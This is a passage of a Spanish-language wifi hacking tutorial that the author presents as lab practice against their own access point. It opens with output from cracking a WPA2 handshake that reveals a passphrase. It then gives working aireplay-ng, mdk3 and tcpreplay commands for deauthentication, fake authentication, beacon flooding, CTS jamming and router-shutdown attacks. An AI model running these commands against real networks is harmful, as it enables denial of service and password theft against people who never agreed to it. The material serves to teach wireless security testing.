+      Time left: 4 hours, 57 minutes, 45 seconds                 0.00%
+
+      [00:00:00] 299/10303727 keys tested (880.17 k/s) 
+
+      Time left: 3 hours, 15 minutes, 6 seconds                  0.00%
+
+      [00:00:00] 451/10303727 keys tested (915.48 k/s) 
+
+      Time left: 3 hours, 7 minutes, 34 seconds                  0.00%
+
+      [00:00:01] 555/10303727 keys tested (928.10 k/s) 
+
+      Time left: 3 hours, 5 minutes, 1 second                    0.01%
+
+                       Current passphrase: manchester                 
+
+
+      Master Key     : 55 01 AE 01 39 05 DF 0B 58 9B EF 29 56 27 80 10 
+                          KEY FOUND! [ manchester ]
+      Transient Key  : 51 23 B5 F0 A5 9A CA 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+      EAPOL HMAC     : 92 E5 79 A4 74 0A 86 69 6E C2 3E 53 7B 76 17 CC 
+</code></pre></div></div>
+<h2 id="ataque-de-de-autenticacion-global">Ataque de De-Autenticacion Global</h2>
+<ul>
+<li>Bueno para este ataque vamos a seguir monitorisando el punto de acceso que creamos desde nuestro celular para eso seguimos los mismos conceptos, para ver los clientes conectados</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web8.png">
+</p>
+
+<ul>
+<li><p>Pero lo que ahora queremos hacer es expulsar a todos los clientes de la red.</p>
+</li>
+<li><p>Para expulsar a todos los clientes de la red la dirección <strong>MAC</strong> del dispositivo a atacar y esa <strong>MAC</strong> es <code>FF:FF:FF:FF:FF:FF</code> esta dirección <strong>MAC</strong> es la dirección <strong>Broadcast</strong>, la cual hace referencia a todos los clientes que están en la red, al expulsar a todos tenemos mas tasa de éxito ya que la mayoría de clientes se van a volver a desconectar y cunado uno se reconecte tenemos un <strong>Handshake</strong> valido.</p>
+</li>
+<li><p>Antes de hacer el ataque no tenemos ningún <strong>Handshake</strong>.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web9.png">
+</p>
+
+<ul>
+<li>Ahora si lo iniciamos los dispositivos se van a desconectar y cuando uno se reconecte capturaremos el <strong>Handshake</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ aireplay-ng -0 15 -e MiguelWifi -c FF:FF:FF:FF:FF:FF wlan0mon
+</code></pre></div></div>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web10new.png">
+</p>
+
+<ul>
+<li>Esta es otra forma.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ aireplay-ng -0 15 -e MiguelWifi wlan0mon
+</code></pre></div></div>
+<ul>
+<li>Si lo que queremos hacer es que ningún cliente se conecte podemos enviar paquetes infinitos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ aireplay-ng -0 0 -e MiguelWifi wlan0mon
+</code></pre></div></div>
+<h2 id="ataque-de-autenticaci-n">Ataque de Autenticación</h2>
+<ul>
+<li><p>Este ataque nos va a permitir autenticar a un cliente a una red inalambrica o a un punto de acceso si vemos el panel de ayuda de <code>aireplay-ng</code> vemos que nos dicen sobre <strong>fakeauth</strong>.</p>
+</li>
+<li><p>Un ejemplo rápida para comprender este concepto es que mediante un <strong>AP</strong> que tenemos vamos a conectar un cliente suponiendo que no hay ningún cliente conectado al <strong>AP</strong>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ airodump-ng --bssid C6:BF:FD:55:E2:F7 --channel 10 wlan0mon
+</code></pre></div></div>
+<ul>
+<li>Si nos podemos a capturar vemos que de momento no hay ningún cliente asociado.</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web11.png">
+</p>
+
+<ul>
+<li>Para autenticar a un cliente debemos proporcionar su dirección <strong>MAC</strong> yo por ejemplo voy a autenticar una laptop que tengo alado para practicar en este laboratorio y me se su dirección <strong>MAC</strong> , no le vamos a indicar paquetes si no que de manera ilimitada asta que se asocie termine.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ aireplay-ng -1 0 -e MiguelWifi -h 00:26:6c:1f:03:d8 wlan0mon
+The interface MAC (9C:EF:D5:F9:1E:C0) doesn't match the specified MAC (-h).
+	ifconfig wlan0mon hw ether 00:26:6C:1F:03:D8
+18:37:14  Waiting for beacon frame (ESSID: MiguelWifi) on channel 10
+Found BSSID &quot;C6:BF:FD:55:E2:F7&quot; to given ESSID &quot;MiguelWifi&quot;.
+
+18:37:14  Sending Authentication Request (Open System)
+
+18:37:16  Sending Authentication Request (Open System) [ACK]
+18:37:16  Authentication successful
+18:37:16  Sending Association Request [ACK]
+18:37:16  Association successful :-) (AID: 1)
+</code></pre></div></div>
+<ul>
+<li>Ahora vemos que como tal el cliente esta autenticado.</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web12.png">
+</p>
+
+<blockquote>
+<p>Si expulsamos al cliente y tratamos de hacer una reconexión manual no va a generar ningun <strong>handshake</strong> por que todo esto es falso en la autenticación el cliente no dispone de la contraseña de la red es por eso que no va a viajar la contraseña por que es una falsa autenticación.</p>
+</blockquote>
+<h1>Inyectar clientes de manera agresiva (Autenticación masiva)</h1>
+<ul>
+<li>Algo que podemos hacer es que con <code>mdk3</code> podemos hacer este tipo de ataque donde de forma agresiva va a inyectar demasiados clientes a una red inalambrica con esto lo que conseguimos es que al estar demasiados clientes se van a expulsar algunos por que va a estar saturada la red y cuando se reconecte podremos capturar el <strong>handshake</strong> es una forma como esta saturada la red se desconecta y se reasocia despues , solo le indicaremos la <strong>MAC</strong> de <strong>AP</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ mdk3 wlan0mon a -a C6:BF:FD:55:E2:F7
+</code></pre></div></div>
+<ul>
+<li>Y se inyectan demasiados clientes tu puedes parar el ataque asta cuando quieras con un <code>CTRL+C</code>.</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web14.png">
+</p>
+
+<h2 id="cts-frame-attack">CTS Frame attack</h2>
+<blockquote>
+<p>Este ataque no suele salir ala primera y se necesita de algo de paciencia</p>
+</blockquote>
+<ul>
+<li><p>Este ataque lo que nos permite es dejar una red inalambrica inoperativa durante un largo periodo de tiempo esto nos permite dejar la red saturada para que los clientes sean expulsados y cuando se vuelvan a conectar automáticamente obtener el <strong>handshake</strong>.</p>
+</li>
+<li><p>Lo primero que vamos a hacer es abrir <code>wireshark</code>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ wireshark &amp;&gt;/dev/null &amp; disown 
+</code></pre></div></div>
+<ul>
+<li>Vamos a seleccionar esa interfaz.</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web15.png">
+</p>
+
+<ul>
+<li>Una vez establecido eso vemos que como tal hay demasiados paquetes y como tal hay podemos ver nuestro <strong>AP</strong>.</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web16.png">
+</p>
+
+<blockquote>
+<p>El paquete CTS o <strong>Clear-to-send</strong> esta formado por <strong>14 Bytes</strong> donde se incluye, <strong>Frame Control</strong>, la duración de la reserva, <strong>Dirección MAC de la estación que recibirá el paquete</strong>  y finalmente el <strong>Frame Check Sequence (FCS)</strong> es para comprobar la integridad de la trama.</p>
+</blockquote>
+<p><img src="/assets/wifi/hacking-wpa2/CTS.png" alt="" /></p>
+<p><img src="/assets/wifi/hacking-wpa2/FCS.png" alt="" /></p>
+<ul>
+<li>Vamos a hacerlo para entenderlo mejor, vamos a filtrar por los paquetes <strong>CTS</strong>.</li>
+</ul>
+<p><img src="/assets/wifi/hacking-wpa2/web17.png" alt="" /></p>
+<ul>
+<li>Si queremos ver todo esto de mejor forma y ver mas información desde consola también podemos usar <code>tshark</code>, vamos a exportarlo a un <code>.cap</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ tshark -w Captura.cap 2&gt;/dev/null
+</code></pre></div></div>
+<ul>
+<li>Ahora nos ponemos en escucha con <code>airodump-ng</code> para poder capturar mas rápido y esperamos unos segundos antes de hacer <code>ctrl+c</code>.</li>
+</ul>
+<p><img src="/assets/wifi/hacking-wpa2/web18.png" alt="" /></p>
+<ul>
+<li>Otra forma es especificando directamente la interfaz.</li>
+</ul>
+<p><img src="/assets/wifi/hacking-wpa2/web19.png" alt="" /></p>
+<ul>
+<li>Si filtramos por lo mismo que en <code>wireshark</code> vemos que ya lo tenemos.</li>
+</ul>
+<p><img src="/assets/wifi/hacking-wpa2/web20.png" alt="" /></p>
+<ul>
+<li>Hay vemos el campo que nos interesa.</li>
+</ul>
+<p><img src="/assets/wifi/hacking-wpa2/web21.png" alt="" /></p>
+<ul>
+<li>Si queremos verlo desde <code>wireshark</code> estos serian.</li>
+</ul>
+<p><img src="/assets/wifi/hacking-wpa2/web22.png" alt="" /></p>
+<ul>
+<li>Vamos a seleccionar un paquete cualquiera en mi caso seria el <strong>19</strong> y vamos a darle en <strong>files</strong> y vamos a seleccionar la opción para guardar un paquete en especifico.</li>
+</ul>
+<p><img src="/assets/wifi/hacking-wpa2/web23.png" alt="" /></p>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ file ataquects.pcap
+ataquects.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (802.11 with radiotap header, capture length 262144)
+</code></pre></div></div>
+<ul>
+<li>Por aquí vemos el campo que nos interesa.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ tshark -r ataquects.pcap -Tfields -e wlan.duration 2&gt;/dev/null
+270
+</code></pre></div></div>
+<ul>
+<li>Vamos abrir la captura.</li>
+</ul>
+<p><img src="/assets/wifi/hacking-wpa2/web24.png" alt="" /></p>
+<ul>
+<li>Estos valores corresponden ala <strong>MAC</strong> del punto de acceso.</li>
+</ul>
+<p><img src="/assets/wifi/hacking-wpa2/web25.png" alt="" /></p>
+<ul>
+<li>Y esto corresponde al tiempo en micro-segundos que esta en <strong>0</strong> <strong>xd</strong> esta en <strong>little endian</strong> puedes convertirlo a decimal con <strong>Python</strong>.</li>
+</ul>
+<p><img src="/assets/wifi/hacking-wpa2/web26.png" alt="" /></p>
+<ul>
+<li><p>Bueno lo mas probable es que si elegimos otro paquete que no se hizo al <strong>AP</strong> por eso el tiempo sea diferente pero bueno sigamos.</p>
+</li>
+<li><p>Nosotros como atacantes podemos establecer el tiempo máximo que son <strong>30K</strong>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ python
+Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
+[GCC 10.2.1 20210110] on linux
+Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
+&gt;&gt;&gt; hex(30000)
+'0x7530'
+&gt;&gt;&gt; 
+</code></pre></div></div>
+<ul>
+<li>Pero hay que darle la vuelta entonces quedaría <strong>3075</strong>.</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web27.png">
+</p>
+
+<ul>
+<li>Ahora vamos a establecer la dirección <strong>MAC</strong> del <strong>AP</strong>.</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web28.png">
+</p>
+
+<ul>
+<li><p>Ahora lo guardamos y lo abrimos con <code>wireshark</code>.</p>
+</li>
+<li><p>Bueno como tal tuve unos pequeños inconvenientes y tuve que usar otro paquete pero para hacer el ataque simplemente hacemos lo siguiente.</p>
+</li>
+<li><p>Con <code>tcpreplay</code> indicándole la tarjeta de red en modo monitor a máxima velocidad le indicamos los <strong>loops</strong> para que haga 10K de iteraciones y le indicamos el paquete para que lo repita.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ tcpreplay --intf1=wlan0mon --topspeed --loop=10000 ya.pcap 2&gt;/dev/null
+Actual: 10000 packets (280000 bytes) sent in 19.25 seconds
+Rated: 14539.0 Bps, 0.116 Mbps, 519.25 pps
+Statistics for network device: wlan0mon
+	Successful packets:        10000
+	Failed packets:            0
+	Truncated packets:         0
+	Retried packets (ENOBUFS): 0
+	Retried packets (EAGAIN):  0
+</code></pre></div></div>
+<ul>
+<li>Lo que deberíamos de ver en nuestros dispositivos es que la señal de tu wifi las rayitas tienen que disminuir ya que secuestraste de tal manera el ancho de banda, si lo que quieres es el <strong>handshake</strong> simplemente te pones con <code>airodump-ng</code> para capturarlo cuando el cliente se reasocie.</li>
+</ul>
+<h2 id="beacon-flood-mode-attack">Beacon Flood Mode Attack</h2>
+<ul>
+<li><p>Para empezar el <strong>Beacon</strong> es un tipo de paquete que contiene informacion sobre el punto de acceso informacion sobre el canal en el que esta, el tipo de encriptado, el nombre y esas cosas.</p>
+</li>
+<li><p>Una forma de ver los paquetes es con <code>tshark</code> podemos filtrar directamente por esos paquetes mientras en otra terminal nos ponemos a monitorear con <code>airodump-ng</code>.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/web29.png">
+</p>
+
+<ul>
+<li><p>Con la herramienta <code>mdk3</code> podemos generar este ataque esto lo que consigue es generar muchos paquetes de tipo <strong>Beacon</strong> vamos a generar demasiados <strong>AP</strong> en el mismo canal donde se sitúa el <strong>AP</strong> que tenemos para que la red se quede inoperativa para los clientes.</p>
+</li>
+<li><p>Vamos a generar los nombres de los <strong>AP</strong> que vamos a generar.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ for i in $(seq 1 10); do echo &quot;WifiFree$i&quot; &gt;&gt; names.txt; done
+❯ catn names.txt
+WifiFree1
+WifiFree2
+WifiFree3
+WifiFree4
+WifiFree5
+WifiFree6
+WifiFree7
+WifiFree8
+WifiFree9
+WifiFree10
+</code></pre></div></div>
+<ul>
+<li>Ahora con la herramienta <code>mdk3</code> vamos a hacer el siguiente ataque.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ mdk3 --help
+
+MDK 3.0 v6 - &quot;Yeah, well, whatever&quot;
+by ASPj of k2wrlz, using the osdep library from aircrack-ng
+And with lots of help from the great aircrack-ng community:
+Antragon, moongray, Ace, Zero_Chaos, Hirte, thefkboss, ducttape,
+telek0miker, Le_Vert, sorbo, Andy Green, bahathir and Dawid Gajownik
+THANK YOU!
+
+MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.
+IMPORTANT: It is your responsibility to make sure you have permission from the
+network owner before running MDK against it.
+
+This code is licenced under the GPLv2
+
+MDK USAGE:
+mdk3 &lt;interface&gt; &lt;test_mode&gt; [test_options]
+
+Try mdk3 --fullhelp for all test options
+Try mdk3 --help &lt;test_mode&gt; for info about one test only
+
+TEST MODES:
+b   - Beacon Flood Mode
+      Sends beacon frames to show fake APs at clients.
+      This can sometimes crash network scanners and even drivers!
+</code></pre></div></div>
+<ul>
+<li>Ahora simplemente le pasamos el nombre del fichero donde estan los nombres de los <strong>AP</strong> y el canal donde se situa el <strong>AP</strong> que queremos atacar y comenzamos el ataque.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ mdk3 wlan0mon b -f names.txt -a -s 1000 -c 2
+</code></pre></div></div>
+<ul>
+<li>Ahora podemos ver como se crearon varios <strong>AP</strong> que fueron los que indicamos en el <strong>names.txt</strong> que están en el mismo canal estos se irán incrementando y va a saturar el <strong>AP</strong> victima ya que hay demasiados <strong>AP</strong> en el mismo canal.</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/beacon.png">
+</p>
+
+<ul>
+<li>Otra forma seria de esta manera el problema es que el <strong>SSID</strong> van a ser aleatorios el nombre no lo vamos a especificar nosotros y con esto se dañaría el espectro de onda de la red para que quede inoperativa.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ mdk3 wlan0mon b -c 2
+</code></pre></div></div>
+<h2 id="disassociation-amok-mode-attack">Disassociation Amok Mode Attack</h2>
+<ul>
+<li><p>Este ataque consiste básicamente en hacer un ataque de deautenticacion dirigido para poder hacer este ataque necesitamos crear un fichero con las direcciones <strong>MAC</strong> de los clientes a los cuales queremos deautenticar del <strong>AP</strong>.</p>
+</li>
+<li><p>Si monitoreamos el <strong>AP</strong> en mi caso hay 2 clientes conectados al <strong>AP</strong>.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/d1.png">
+</p>
+
+<ul>
+<li>En mi caso voy a indicar la direccion <strong>MAC</strong> <strong>84:4B:F5:48:6C:CF</strong> que es el cliente que quiero expulsar.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ nvim blacklist
+❯ catn blacklist
+84:4B:F5:48:6C:CF
+</code></pre></div></div>
+<ul>
+<li>Ahora para hacer el ataque simplemente usamos la herramienta <code>mdk3</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ mdk3 wlan0mon d -w blacklist -c 1
+
+Periodically re-reading blacklist/whitelist every 3 seconds
+</code></pre></div></div>
+<ul>
+<li>Todos los <strong>AP</strong> que operen en el canal 1 va a estar expulsando a todos los clientes que tengan esa dirección <strong>MAC</strong> que indicamos en el archivo <strong>blacklist</strong>.</li>
+</ul>
+<h2 id="michael-shutdown-exploitation">Michael Shutdown Exploitation</h2>
+<ul>
+<li>Este ataque lo que nos permite es apagar un <strong>router</strong> el problema de este ataque es que no es muy efectivo no hay mucha documentación sobre este ataque.</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/d2.png">
+</p>
+
+<ul>
+<li><p>Como vemos no hay mucha información sobre este ataque a si que vamos a hacerlo de todas formas para este ataque necesitamos la herramienta <code>mdk3</code>.</p>
+</li>
+<li><p>Esto lo que hace es emitir los paquetes para que se apague el router pero no siempre funciona le vamos a indicar la dirección <strong>MAC</strong> del <strong>AP</strong>.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ mdk3 wlan0mon m -t C6:BF:FD:55:E2:F7
+</code></pre></div></div>
+<h2 id="ataques-pasivos">Ataques Pasivos</h2>
+<ul>
+<li>Bueno asta ahora hemos hecho ataques donde básicamente estamos deautenticando a los clientes del <strong>AP</strong> para que cuando se reconecten de forma automática al <strong>AP</strong> obtener el <strong>Handshake</strong> pero también hay una forma de básicamente obtener el <strong>handshake</strong> sin expulsar a nadie ya que cuando un dispositivo ya estuvo conectado al <strong>AP</strong> desde hace mucho cuando el dispositivo detecte la red wifi se va a conectar y si nosotros estamos en escucha en modo monitor vamos a capturar el <strong>handshake</strong> simplemente por que estamos escuchando  es una forma algo lenta por que tenemos que esperar a que se conecte o se reconecte pero bueno es igual funcional.</li>
+</ul>
+<h2 id="modos-de-filtro-con-tshark">Modos de filtro con tshark</h2>
+<ul>
+<li>Bueno para esto recomiendo hacer un ataque de deautenticacion global para capturar el <strong>handshake</strong> y exportar.</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/d3.png">
+</p>
+
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/d4.png">
+</p>
+
+<p>Cuando un dispositivo se conecta ala red emite el <strong>Probe Request</strong> para filtrar por ese paquete se hace de esta manera</p>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ tshark -r Captura-01.cap -Y &quot;wlan.fc.type_subtype==4&quot; 2&gt;/dev/null
+</code></pre></div></div>
+<p>Si queremos capturar esos paquetes podemos hacer lo siguiente</p>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ tshark -i wlan0mon -Y &quot;wlan.fc.type_subtype==4&quot; 2&gt;/dev/null
+</code></pre></div></div>
+<p>Y en una terminal por debajo vamos a ejecutar lo siguiente <code>airodump-ng wlan0mon</code></p>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/d5.png">
+</p>
+
+<p>Cuando el dispositivo emite un <strong>Probe Request</strong> hay un <strong>Probe Response</strong></p>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/d6.png">
+</p>
+
+<ul>
+<li>Después están los paquetes de asociación que son cuando el cliente se a tratado de asociar al <strong>AP</strong>  para filtrar por esos es de la siguiente forma.</li>
+</ul>
+<p align="center">
+<img src="/assets/wifi/hacking-wpa2/d7.png">
+</p>
+
+<ul>
+<li>También tenemos el <strong>Association Response</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ tshark -r Captura-01.cap -Y &quot;wlan.fc.type_subtype==1&quot; 2&gt;/dev/null
+ 7819 133.720190 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 129 Association Response, SN=3088, FN=0, Flags=........
+</code></pre></div></div>
+<ul>
+<li>Hay vemos un paquete <strong>Beacon</strong> que ya lo habíamos visto.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ tshark -r Captura-01.cap -Y &quot;wlan.fc.type_subtype==8&quot; 2&gt;/dev/null
+    1   0.000000 c6:bf:fd:55:e2:f7 → Broadcast    802.11 281 Beacon frame, SN=1066, FN=0, Flags=........, BI=100, SSID=&quot;MiguelWifi&quot;
+</code></pre></div></div>
+<ul>
+<li>Estos son los paquetes de autenticacion.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ tshark -r Captura-01.cap -Y &quot;wlan.fc.type_subtype==11&quot; 2&gt;/dev/null
+ 6003 130.208233 1a:58:18:4e:8a:68 → c6:bf:fd:55:e2:f7 802.11 65 Authentication, SN=68, FN=0, Flags=........
+ 7806 133.704687 1a:58:18:4e:8a:68 → c6:bf:fd:55:e2:f7 802.11 65 Authentication, SN=4029, FN=0, Flags=........
+ 7809 133.708056 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3086, FN=0, Flags=........
+34291 184.497250 1a:58:18:4e:8a:68 → c6:bf:fd:55:e2:f7 802.11 65 Authentication, SN=3285, FN=0, Flags=........
+34297 184.501073 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=........
+34298 184.502776 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
+34299 184.502921 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
+34300 184.504065 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
+34301 184.504392 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
+34302 184.504766 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
+34303 184.505328 c6:bf:fd:55:e2:f7 → 1a:58:18:4e:8a:68 802.11 30 Authentication, SN=3135, FN=0, Flags=....R...
